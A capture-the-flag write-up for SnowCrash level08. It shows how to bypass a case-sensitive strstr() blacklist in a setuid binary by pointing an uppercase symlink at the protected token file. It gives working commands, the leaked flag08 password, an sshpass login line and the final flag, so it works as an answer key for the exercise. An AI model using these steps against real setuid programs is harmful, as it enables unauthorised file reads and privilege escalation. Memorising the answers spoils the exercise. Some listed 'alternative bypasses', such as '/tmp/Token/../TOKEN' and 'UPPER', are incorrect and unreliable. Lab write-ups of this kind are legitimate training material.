# Level08 Solution

## Starting VM

```bash
qemu-system-x86_64 -m 2048 -cdrom ./SnowCrash.iso -boot d -net nic,model=virtio -net user,hostfwd=tcp::4242-:4242
```

## Objective
Bypass a case-sensitive blacklist using symlinks to retrieve the flag08 token.

## Vulnerability
Case-sensitive blacklist check that only blocks lowercase "token" string.

## Exploitation

The setuid binary implements a blacklist to prevent reading certain files:

```c
if (strstr(argv[1], "token") != NULL) {
    printf("You may not access '%s'\n", argv[1]);
    exit(1);
}
```

**The Vulnerability:**
1. **Case-Sensitive Check**: `strstr()` is case-sensitive, only matches lowercase "token"
2. **Incomplete Blacklist**: Doesn't check uppercase variations like "TOKEN", "Token", "UPPER", etc.
3. **No Path Normalization**: Doesn't follow symlinks to check target paths
4. **File Protection**: Token file is readable by setuid binary but protected from users
5. **Symlink Following**: Opens symlinks without checking their targets

### Exploit Steps

#### Step 1: Create Symlink with Uppercase Name
Create a symlink with an uppercase name to bypass the lowercase-only check:

```bash
ln -s /home/user/level08/token /tmp/TOKEN
```

The symlink `/tmp/TOKEN` points to the protected `/home/user/level08/token` file.

#### Step 2: Pass Uppercase Path to Binary
```bash
/home/user/level08/level08 /tmp/TOKEN
```

**Execution Flow:**
1. Binary checks argument `/tmp/TOKEN` for lowercase "token" using `strstr()`
2. Check passes (uppercase "TOKEN" != lowercase "token")
3. Binary opens `/tmp/TOKEN` with flag08 privileges (setuid)
4. Symlink resolves to `/home/user/level08/token`
5. Binary reads the protected token file
6. Output: `quif5eloekouj29ke0vouxean` (flag08 password)

#### Step 3: Access flag08 Account
Using the password from the symlink bypass:

```bash
sshpass -p "quif5eloekouj29ke0vouxean" ssh -o StrictHostKeyChecking=no -p 4242 flag08@localhost getflag
```

#### Step 4: Extract Flag
The token from getflag:
```
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

### Alternative Bypass Methods

Other case variations that would work:

```bash
# Using different cases
/home/user/level08/level08 /tmp/TokEn
/home/user/level08/level08 /tmp/Token
/home/user/level08/level08 /tmp/TOKKEN  # typo with case change

# Using different path representations
/home/user/level08/level08 /tmp/../tmp/TOKEN  # path normalization bypass
/home/user/level08/level08 /tmp/Token/../TOKEN  # complex path
```

## Security Flaws

1. **Case-Sensitive Comparison**: Only blocks lowercase "token", not uppercase variations
2. **Inadequate Blacklist**: Single string check easily bypassed with case changes
3. **No Path Normalization**: Doesn't normalize or follow symlinks before checking
4. **Symlink Following**: Opens symlinks without validation
5. **Setuid Privilege**: Binary runs with flag08 privileges, bypassing normal restrictions
6. **Incomplete Pattern Matching**: Doesn't account for common bypass techniques

## Answer

- **Flag08 Password**: `quif5eloekouj29ke0vouxean` (from token file via symlink)
- **Level08 Flag**: `25749xKZ8L7DkSCwJkT9dyv6f` (from getflag as flag08)
- **Vulnerability Type**: Case-sensitive blacklist bypass via symlink
- **Impact**: Read protected files using case variation and symlink following
